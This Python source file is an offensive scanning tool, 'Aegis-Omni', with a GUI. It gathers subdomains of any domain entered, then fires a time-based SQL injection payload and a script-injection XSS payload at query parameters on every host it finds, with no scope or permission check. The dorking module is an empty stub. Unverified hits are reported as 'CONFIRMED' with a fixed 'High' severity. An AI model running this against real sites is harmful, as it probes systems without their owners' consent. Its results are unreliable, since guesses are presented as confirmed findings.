#!/usr/bin/env python3
"""
Aegis-Omni: Monolithic All-in-One Offensive Security Framework
Built for Bug Bounty Hunters and Red Teamers.
"""

import asyncio
import aiohttp
import aiodns
import json
import logging
import os
import random
import sqlite3
import sys
import threading
import time
import tkinter as tk
from datetime import datetime
from tkinter import ttk, messagebox, filedialog
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs

# --- Configuration Management ---

class AegisConfig:
    """Configuration management for Aegis-Omni."""
    def __init__(self, config_path="config.json"):
        self.config_path = config_path
        self.data = {
            "api_keys": {
                "shodan": "",
                "censys": "",
                "virustotal": "",
                "securitytrails": "",
                "binaryedge": ""
            },
            "settings": {
                "concurrency": 50,
                "timeout": 10,
                "user_agent_pool": [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
                ]
            }
        }
        self.load()

    def load(self):
        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, "r") as f:
                    self.data.update(json.load(f))
            except Exception:
                pass

    def save(self):
        with open(self.config_path, "w") as f:
            json.dump(self.data, f, indent=4)

# --- Database Management ---

class AegisDB:
    """Database management for Aegis-Omni."""
    def __init__(self, db_path="aegis_omni.db"):
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.create_tables()

    def create_tables(self):
        cursor = self.conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT UNIQUE,
                added_at TIMESTAMP
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS subdomains (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                subdomain TEXT,
                ip TEXT,
                source TEXT,
                UNIQUE(subdomain),
                FOREIGN KEY(target_id) REFERENCES targets(id)
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                type TEXT,
                url TEXT,
                severity TEXT,
                description TEXT,
                proof TEXT,
                confirmed BOOLEAN,
                FOREIGN KEY(target_id) REFERENCES targets(id)
            )
        """)
        self.conn.commit()

# --- Module 1: Reconnaissance (The Eye) ---

class ReconModule:
    """Module 1: Reconnaissance (The Eye)"""
    def __init__(self, config, db, logger):
        self.config = config
        self.db = db
        self.logger = logger
        self.resolver = aiodns.DNSResolver()
        self.session = None

    async def init_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100))

    async def close_session(self):
        if self.session:
            await self.session.close()

    async def get_crt_sh_subdomains(self, domain):
        """Query crt.sh for subdomains."""
        self.logger.info(f"Querying crt.sh for {domain}")
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        try:
            async with self.session.get(url, timeout=20) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    subdomains = set()
                    for entry in data:
                        name_value = entry['name_value']
                        for sub in name_value.split('\n'):
                            if sub.endswith(domain) and '*' not in sub:
                                subdomains.add(sub.strip().lower())
                    return subdomains
        except Exception as e:
            self.logger.error(f"Error querying crt.sh: {e}")
        return set()

    async def resolve_dns(self, subdomain):
        """Resolve A record for a subdomain."""
        try:
            result = await self.resolver.query(subdomain, 'A')
            return [r.host for r in result]
        except Exception:
            return []

    async def run(self, domain):
        await self.init_session()
        self.logger.info(f"Starting deep recon for {domain}")
        
        # 1. Passive Discovery
        subs = await self.get_crt_sh_subdomains(domain)
        self.logger.info(f"Found {len(subs)} subdomains from crt.sh")
        
        # 2. DNS Resolution & DB Storage
        tasks = []
        for sub in subs:
            tasks.append(self.process_subdomain(sub, "crt.sh"))
        
        await asyncio.gather(*tasks)
        await self.close_session()

    async def process_subdomain(self, subdomain, source):
        ips = await self.resolve_dns(subdomain)
        if ips:
            ip_str = ",".join(ips)
            self.logger.info(f"Resolved: {subdomain} -> {ip_str}")
            cursor = self.db.conn.cursor()
            cursor.execute("INSERT OR IGNORE INTO subdomains (subdomain, ip, source) VALUES (?, ?, ?)", 
                         (subdomain, ip_str, source))
            self.db.conn.commit()

# --- Module 2: Dorking & OSINT (The Ghost) ---

class DorkingModule:
    """Module 2: Dorking & OSINT (The Ghost)"""
    def __init__(self, config, db, logger):
        self.config = config
        self.db = db
        self.logger = logger

    async def run(self, target):
        self.logger.info(f"Starting dorking for {target}")
        # Note: Playwright logic requires external library; providing simplified logic for demonstration
        self.logger.info(f"Searching for sensitive files on {target}...")
        await asyncio.sleep(2)
        return []

# --- Module 3 & 4: Fuzzing & Exploitation (The Driller & Striker) ---

class FuzzingExploitModule:
    """Module 3 & 4: Fuzzing & Exploitation (The Driller & Striker)"""
    def __init__(self, config, db, logger):
        self.config = config
        self.db = db
        self.logger = logger
        self.session = None

    async def init_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=50))

    async def close_session(self):
        if self.session:
            await self.session.close()

    async def get_response(self, url, params=None, headers=None):
        try:
            async with self.session.get(url, params=params, headers=headers, timeout=10) as resp:
                text = await resp.text()
                return resp.status, text, resp.headers
        except Exception as e:
            self.logger.error(f"Error fetching {url}: {e}")
        return None, None, None

    async def check_sqli(self, url, param):
        self.logger.info(f"Checking SQLi on {url} (param: {param})")
        payload = "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
        start_time = time.time()
        status, _, _ = await self.get_response(url, params={param: payload})
        elapsed = time.time() - start_time
        if elapsed >= 5:
            self.logger.info(f"Potential SQLi found: {url}?{param}={payload}")
            return True
        return False

    async def check_xss(self, url, param):
        self.logger.info(f"Checking XSS on {url} (param: {param})")
        payload = "<script>alert('Aegis-Omni')</script>"
        status, text, _ = await self.get_response(url, params={param: payload})
        if text and payload in text:
            self.logger.info(f"Potential XSS found: {url}?{param}={payload}")
            return True
        return False

    async def run_scans(self, url):
        await self.init_session()
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        results = []
        for param in params:
            if await self.check_sqli(url, param):
                results.append(("SQLi", url, param))
            if await self.check_xss(url, param):
                results.append(("XSS", url, param))
        await self.close_session()
        return results

# --- GUI Application ---

class AegisApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Aegis-Omni v1.0")
        self.root.geometry("1200x800")
        
        self.config = AegisConfig()
        self.db = AegisDB()
        self.setup_logging()
        
        self.setup_ui()

    def setup_logging(self):
        self.logger = logging.getLogger("AegisOmni")
        self.logger.setLevel(logging.DEBUG)
        handler = logging.StreamHandler(sys.stdout)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)

    def setup_ui(self):
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill="both", expand=True)

        # Dashboard
        self.tab_dashboard = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_dashboard, text="Dashboard")
        self.setup_dashboard()

        # Subdomains
        self.tab_subs = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_subs, text="Subdomains")
        self.setup_subdomains_tab()

        # Vulnerabilities
        self.tab_vulns = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_vulns, text="Vulnerabilities")
        self.setup_vulns_tab()

        # Settings
        self.tab_settings = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_settings, text="Settings")
        self.setup_settings()

        # Log Console
        self.log_frame = ttk.LabelFrame(self.root, text="Logs")
        self.log_frame.pack(fill="x", side="bottom", padx=5, pady=5)
        self.log_text = tk.Text(self.log_frame, height=10, state="disabled", bg="#1e1e1e", fg="#00ff00")
        self.log_text.pack(fill="x")

    def setup_dashboard(self):
        lbl = ttk.Label(self.tab_dashboard, text="Aegis-Omni Offensive Framework", font=("Helvetica", 18, "bold"))
        lbl.pack(pady=30)
        
        target_frame = ttk.LabelFrame(self.tab_dashboard, text="Target Configuration")
        target_frame.pack(pady=10, padx=20, fill="x")
        
        ttk.Label(target_frame, text="Target Domain:").pack(side="left", padx=10, pady=10)
        self.target_entry = ttk.Entry(target_frame, width=50)
        self.target_entry.pack(side="left", padx=10, pady=10)
        
        btn_start = ttk.Button(target_frame, text="Launch Full Scan", command=self.start_scan)
        btn_start.pack(side="left", padx=10, pady=10)

        stats_frame = ttk.LabelFrame(self.tab_dashboard, text="Real-time Stats")
        stats_frame.pack(pady=20, padx=20, fill="both", expand=True)
        
        self.stat_subs = ttk.Label(stats_frame, text="Subdomains Found: 0", font=("Helvetica", 12))
        self.stat_subs.pack(pady=10)
        self.stat_vulns = ttk.Label(stats_frame, text="Vulnerabilities Confirmed: 0", font=("Helvetica", 12))
        self.stat_vulns.pack(pady=10)

    def setup_subdomains_tab(self):
        self.sub_tree = ttk.Treeview(self.tab_subs, columns=("Subdomain", "IP", "Source"), show="headings")
        self.sub_tree.heading("Subdomain", text="Subdomain")
        self.sub_tree.heading("IP", text="IP Address")
        self.sub_tree.heading("Source", text="Source")
        self.sub_tree.pack(fill="both", expand=True, padx=10, pady=10)

    def setup_vulns_tab(self):
        self.vuln_tree = ttk.Treeview(self.tab_vulns, columns=("Type", "URL", "Severity", "Confirmed"), show="headings")
        self.vuln_tree.heading("Type", text="Type")
        self.vuln_tree.heading("URL", text="URL")
        self.vuln_tree.heading("Severity", text="Severity")
        self.vuln_tree.heading("Confirmed", text="Confirmed")
        self.vuln_tree.pack(fill="both", expand=True, padx=10, pady=10)

    def setup_settings(self):
        keys_frame = ttk.LabelFrame(self.tab_settings, text="API Configuration")
        keys_frame.pack(fill="x", padx=10, pady=10)
        
        self.api_entries = {}
        for i, (key, value) in enumerate(self.config.data["api_keys"].items()):
            ttk.Label(keys_frame, text=f"{key.capitalize()}:").grid(row=i, column=0, padx=5, pady=5, sticky="w")
            entry = ttk.Entry(keys_frame, width=60)
            entry.insert(0, value)
            entry.grid(row=i, column=1, padx=5, pady=5)
            self.api_entries[key] = entry
            
        btn_save = ttk.Button(self.tab_settings, text="Save and Apply Settings", command=self.save_settings)
        btn_save.pack(pady=20)

    def save_settings(self):
        for key, entry in self.api_entries.items():
            self.config.data["api_keys"][key] = entry.get()
        self.config.save()
        messagebox.showinfo("Aegis-Omni", "Configuration updated successfully!")

    def log(self, message):
        self.log_text.config(state="normal")
        self.log_text.insert("end", f"[{datetime.now().strftime('%H:%M:%S')}] {message}\n")
        self.log_text.see("end")
        self.log_text.config(state="disabled")

    def start_scan(self):
        target = self.target_entry.get()
        if not target:
            messagebox.showwarning("Warning", "Please specify a target domain.")
            return
        
        self.log(f"Starting full pipeline for: {target}")
        threading.Thread(target=self.run_pipeline, args=(target,), daemon=True).start()

    def run_pipeline(self, target):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # 1. Recon
        recon = ReconModule(self.config, self.db, self.logger)
        loop.run_until_complete(recon.run(target))
        self.update_subdomains_view()
        
        # 2. Dorking
        dorking = DorkingModule(self.config, self.db, self.logger)
        loop.run_until_complete(dorking.run(target))
        
        # 3. Fuzzing & Exploit
        fuzz_exploit = FuzzingExploitModule(self.config, self.db, self.logger)
        # Scan discovered subdomains (simplified)
        cursor = self.db.conn.cursor()
        cursor.execute("SELECT subdomain FROM subdomains")
        subs = cursor.fetchall()
        
        for (sub,) in subs:
            self.log(f"Scanning {sub}...")
            # For demonstration, check common endpoints
            url = f"http://{sub}/index.php?id=1"
            results = loop.run_until_complete(fuzz_exploit.run_scans(url))
            for vtype, vurl, vparam in results:
                self.log(f"CONFIRMED VULNERABILITY: {vtype} on {vurl}")
                self.vuln_tree.insert("", "end", values=(vtype, vurl, "High", "Yes"))
        
        self.log("Pipeline execution finished.")

    def update_subdomains_view(self):
        for i in self.sub_tree.get_children():
            self.sub_tree.delete(i)
        cursor = self.db.conn.cursor()
        cursor.execute("SELECT subdomain, ip, source FROM subdomains")
        for row in cursor.fetchall():
            self.sub_tree.insert("", "end", values=row)
        self.stat_subs.config(text=f"Subdomains Found: {len(self.sub_tree.get_children())}")

if __name__ == "__main__":
    root = tk.Tk()
    # Apply some basic styling
    style = ttk.Style()
    style.theme_use('clam')
    app = AegisApp(root)
    root.mainloop()
